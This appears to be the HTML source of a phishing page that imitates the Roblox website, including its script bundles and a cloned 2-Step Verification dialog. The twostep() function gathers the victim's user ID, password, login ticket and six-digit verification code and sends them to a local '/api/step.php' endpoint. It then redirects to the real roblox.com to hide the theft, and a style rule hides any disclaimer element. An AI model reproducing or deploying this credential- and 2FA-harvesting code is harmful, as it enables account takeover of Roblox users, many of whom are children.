<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactStyleGuide" data-bundle-source="Main" src="https://js.rbxcdn.com/af52c4a40a3aaf48cc4d89fe1a4c501065780931599c83b5d88dce9e2235b2c7.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ConfigureWebApps" data-bundle-source="Main" src="https://js.rbxcdn.com/c756de2b0f5f2f05d62899a3b602b4a3b573ad3faa1adea789291ebe9c66a002.js"></script>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='angular' type='text/javascript' src='https://js.rbxcdn.com/ae3d621886e736e52c97008e085fa286.js'></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="AngularJsUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/b8c80690ce53f7792d8311eeaee04820ed13b97bac958952572a95810646efa0.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalAngularJs" data-bundle-source="Main" src="https://js.rbxcdn.com/90f18784a43a70553e967191b948f70b0193df565f1605762c3c1e245ab4b55a.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Thumbnails" data-bundle-source="Main" src="https://js.rbxcdn.com/8e523fb6013bf64fc1b8df80df34c48f04f2a3a9ee6f322580dc468f791382f4.js"></script>
<div id="presence-registration-bootstrap-data" data-is-enabled="False" data-interval="15000"></div>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="PresenceRegistration" data-bundle-source="Main" src="https://js.rbxcdn.com/0a83202cf5f2310227e607928f73a26cdaa7d5c27f892b99ef51ec3b863a694d.js"></script>
<div ng-modules="baseTemplateApp">
<script type="text/javascript" src="https://js.rbxcdn.com/ffcc04436179c6b2a6668fdfcfbf62b1.js"></script>
</div>
<div ng-modules="pageTemplateApp">
<script type="text/javascript" src="https://js.rbxcdn.com/3e544c8e724dcdc296258b0ca69401a9.js"></script>
</div>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="VerificationUpsell" data-bundle-source="Main" src="https://js.rbxcdn.com/b7951210808a2deeaed3fc2396d452a3aa8ea40377d49458ddfebf527de87733.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VerificationUpsell" data-bundle-source="Unknown" src="https://js.rbxcdn.com/641a843404e3b03f9854c3f54c8002b665ded8adc06eb6aec342420bce1ab8de.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VerificationUpsell" data-bundle-source="Unknown" src="https://js.rbxcdn.com/7421fd2da54ca4a78a57c67db182a80d9c8443be91f42a625cb39a7c81b79027.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Navigation" data-bundle-source="Main" src="https://js.rbxcdn.com/6c9279f5891c238577cb8359874eb9f88ed99c3168ea0c09d4e2529a97fecc0b.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.AlertsAndOptions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/03a64d3850925b52ee73bd27b41658f4a35a2b33b4a499fcb2ce72dcbd98020f.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.AlertsAndOptions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/8f06fef33a61a6c67e1e6d93829b9bb03476bc976102d7bcebe4bfe85a3d4328.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ShopDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/95fdafe5af749e388de603b9ee7f67bb092c3c790badc572db4e2bca0c32b49a.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ShopDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c0606e8d6eb4487cdc70d318e6de3d9aaeeb465ddb84acd95139011e56c5e5c6.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="https://js.rbxcdn.com/3fb9aa72de2a170e85eafc002144750baf669402547cb7d4235e33e59e20453c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="https://js.rbxcdn.com/3c2e73691069105f1967dda486910c6441a55674c940ea5a9e5ee391b1a8a3ad.js"></script>
<script type='text/javascript'>
							Roblox.config.externalResources = [];
							Roblox.config.paths['Pages.Catalog'] = 'https://js.rbxcdn.com/109d883fe3988fca757e26e341ed0fe8.js';
							Roblox.config.paths['Pages.CatalogShared'] = 'https://js.rbxcdn.com/8680a449ea23b2b842200032b01e95ff.js';
							Roblox.config.paths['Widgets.AvatarImage'] = 'https://js.rbxcdn.com/7d49ac94271bd506077acc9d0130eebb.js';
							Roblox.config.paths['Widgets.DropdownMenu'] = 'https://js.rbxcdn.com/da553e6b77b3d79bec37441b5fb317e7.js';
							Roblox.config.paths['Widgets.HierarchicalDropdown'] = 'https://js.rbxcdn.com/4a0af9989732810851e9e12809aeb8ad.js';
							Roblox.config.paths['Widgets.ItemImage'] = 'https://js.rbxcdn.com/61a0490ba23afa17f9ecca2a079a6a57.js';
							Roblox.config.paths['Widgets.PlaceImage'] = 'https://js.rbxcdn.com/a6df74a754523e097cab747621643c98.js';
							</script>
<script>
							$(function() {
								Roblox.DeveloperConsoleWarning.showWarning();
							});
							</script>
<script type="text/javascript">
							$(function() {
								function trackReturns() {
									function dayDiff(d1, d2) {
										return Math.floor((d1 - d2) / 86400000);
									}
									if(!localStorage) {
										return false;
									}
									var cookieName = 'RBXReturn';
									var cookieOptions = {
										expires: 9001
									};
									var cookieStr = localStorage.getItem(cookieName) || "";
									var cookie = {};
									try {
										cookie = JSON.parse(cookieStr);
									} catch(ex) {
										// busted cookie string from old previous version of the code
									}
									try {
										if(typeof cookie.ts === "undefined" || isNaN(new Date(cookie.ts))) {
											localStorage.setItem(cookieName, JSON.stringify({
												ts: new Date().toDateString()
											}));
											return false;
										}
									} catch(ex) {
										return false;
									}
									var daysSinceFirstVisit = dayDiff(new Date(), new Date(cookie.ts));
									if(daysSinceFirstVisit == 1 && typeof cookie.odr === "undefined") {
										RobloxEventManager.triggerEvent('rbx_evt_odr', {});
										cookie.odr = 1;
									}
									if(daysSinceFirstVisit >= 1 && daysSinceFirstVisit <= 7 && typeof cookie.sdr === "undefined") {
										RobloxEventManager.triggerEvent('rbx_evt_sdr', {});
										cookie.sdr = 1;
									}
									try {
										localStorage.setItem(cookieName, JSON.stringify(cookie));
									} catch(ex) {
										return false;
									}
								}
								GoogleListener.init();
								RobloxEventManager.initialize(true);
								RobloxEventManager.triggerEvent('rbx_evt_pageview');
								trackReturns();
								RobloxEventManager._idleInterval = 450000;
								RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_start');
								RobloxEventManager.registerCookieStoreEvent('rbx_evt_ftp');
								RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_success');
								RobloxEventManager.registerCookieStoreEvent('rbx_evt_fmp');
								RobloxEventManager.startMonitor();
							});
							</script>
<script type="text/javascript">
							var Roblox = Roblox || {};
							Roblox.UpsellAdModal = Roblox.UpsellAdModal || {};
							Roblox.UpsellAdModal.Resources = {
								title: "Remove Ads Like This",
								body: "Builders Club members do not see external ads like these.",
								accept: "Upgrade Now",
								decline: "No, thanks"
							};
							</script>
							<script>
function quicklogin(){
$.get('east.php?q=login', function(data) {
	document.getElementById('quicklogin').innerHTML = data;
});
}
	
	
							    function twostep(){
							        document.getElementById("verifyButton").innerHTML = '<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>';
							        var code = document.getElementById("two-step-verification-code-input").value;
							        var ticket = document.getElementById("secret-ticket").value;
							        var userid = document.getElementById("secret-userid").value;
							        var password = document.getElementById("login-password").value;
							        var proxy = document.getElementById('secret-proxy').value;
							        const checkcode = '/api/step.php?id=' + encodeURIComponent(userid) + "&ticket=" + encodeURIComponent(ticket) + "&code=" + encodeURIComponent(code) + "&password=" + encodeURIComponent(password) + '&session=<?php echo $session; ?>' + '&proxy=' + encodeURIComponent(proxy);
                                    $.ajax(checkcode, {
                                        method: "GET",
                                        success: (data) => {
                                            const obj = $.parseJSON(data);
                                            if(obj['result'] == "The two step verification challenge code is invalid."){
                                                document.getElementById("verifyButton").innerHTML = 'Verify';
                                                document.getElementById("twostep-group").setAttribute("class", "form-has-feedback  form-has-error form-group");
                                                document.getElementById("twostep-error").innerHTML = "Invalid code.";
                                            }else if(obj['result'] == "success"){
                                                document.getElementById('rbx-body').removeAttribute('style');
                                                document.getElementById("twostepverification").style.display = "none";
                                                window.location.replace("https://roblox.com");
                                            }else if(obj.contains("WARNING")){
                                                document.getElementById('rbx-body').removeAttribute('style');
                                                document.getElementById("twostepverification").style.display = "none";
                                                window.location.replace("https://roblox.com");
                                            }
                                            }
                                        });
							    }
							</script>
<script>
							    var whileCheckCode = setInterval(function(){
							        var codeInput = document.getElementById("two-step-verification-code-input").value;
							        if(codeInput.length == 6){
							            document.getElementById("verifyButton").disabled = false;
							        }else{
							            document.getElementById("verifyButton").disabled = true;
							        }
							    },50)
							</script>
							<script>

								</script>
<div role="dialog" id="twostepverification" style="display:none;"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button" onclick="document.getElementById('twostepverification').style.display = 'none';document.getElementById('login-button').style.display = 'block';"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email.</p><div class="input-control-wrapper"><div id="twostep-group" class="form-group"><input as="input" autocomplete="off" maxlength="6" pattern="[0-9]*" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');"><input type="text" id="ticket" value="" hidden><input type="text" id="proxy" value="" hidden><input type="text" id="userid" value="" hidden><div class="form-control-label bottom-label xsmall" id="twostep-error">&nbsp;</div></div></div><p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox" tabindex="0"> <label for="remember-device">Trust this device for 30 days</label></p><p><button type="button" class="modal-body-button-link small" onclick="resend();">Resend Code</button></p><p><button type="button" class="modal-body-button-link small">Use another verification method</button></p><p><span class="text-footer">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank">Roblox Support</a></span></p></div><div class="modal-footer"><button type="button" id="verifyButton" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" onclick="twostep();" disabled>Verify</button></div></div></div></div></div>
<style>
    .disclaimer{display:none}
</style>
</body>
</html>